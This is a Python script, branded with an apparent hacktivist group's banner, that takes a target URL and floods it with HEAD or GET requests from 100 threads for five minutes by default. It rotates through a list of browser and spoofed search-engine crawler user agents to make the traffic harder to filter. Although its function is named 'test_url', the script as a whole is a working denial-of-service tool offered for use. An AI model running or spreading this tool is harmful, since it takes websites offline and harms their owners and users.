import requests
import random
import threading
import time


user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'curl/7.64.1',
    'Wget/1.20.3',
    'Python-urllib/3.8',
    'Go-http-client/1.1',
    'Jakarta Commons-HttpClient/3.1',
    'libwww-perl/6.43',
    'Lynx/2.8.9rel.1',
    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
    'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +https://duckduckgo.com)',
    'Mozilla/5.0 (compatible; AhrefsBot/6.1; +https://ahrefs.com/robot/)',
    'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
    'Mozilla/5.0 (compatible; SemrushBot/1.2~bv; +http://www.semrush.com/bot.html)',
    'Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)',
]

lock = threading.Lock()

def print_banner():
    print("\033[97m" + """
 
  █████████     █████      █████████      ███████████ 
 ███▒▒▒▒▒███   ▒▒███      ███▒▒▒▒▒███    ▒▒███▒▒▒▒▒███
▒███    ▒▒▒     ▒███     ▒███    ▒███     ▒███    ▒███
▒▒█████████     ▒███     ▒███████████     ▒██████████ 
 ▒▒▒▒▒▒▒▒███    ▒███     ▒███▒▒▒▒▒███     ▒███▒▒▒▒▒▒  
 ███    ▒███    ▒███     ▒███    ▒███     ▒███        
▒▒█████████     █████    █████   █████    █████       
 ▒▒▒▒▒▒▒▒▒     ▒▒▒▒▒    ▒▒▒▒▒   ▒▒▒▒▒    ▒▒▒▒▒        
                                                      
  SQUAD INDEPENDENCE ARMY FOR PALESTINE 
=======================================================
""" + "\033[0m")

def test_url(url, method='HEAD', timeout=5):
    headers = {'User-Agent': random.choice(user_agents)}
    try:
        start_time = time.time()
        if method == 'HEAD':
            response = requests.head(url, headers=headers, timeout=timeout)
        elif method == 'GET':
            response = requests.get(url, headers=headers, timeout=timeout)
        else:
            with lock:
                print(f"Methods {method} not support!")
            return
        duration = time.time() - start_time
        status_code = response.status_code
        color = '\033[92m' if status_code < 300 else '\033[91m' if status_code < 400 else '\033[93m'
        with lock:
            print(f"URL: {url}")
            print(f"Status: {color}{status_code}\033[0m | Time: {duration:.3f}s")
            
    except requests.RequestException as e:
        with lock:
            print(f"Error: {e}")

def main():
    print_banner()
    url = input("Input URL: ")
    method = input("Metode (HEAD/GET) [default=HEAD]: ").upper() or 'HEAD'
    threads = int(input("Thread [default=100]: ") or 100)
    timeout = int(input("Timeout [default=5]: ") or 5)
    durasi = int(input("Duration [default=300]: ") or 300)

    def worker():
        start_time = time.time()
        while time.time() - start_time < durasi:
            test_url(url, method, timeout)
            time.sleep(0.5)  

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()

if __name__ == "__main__":
    main()
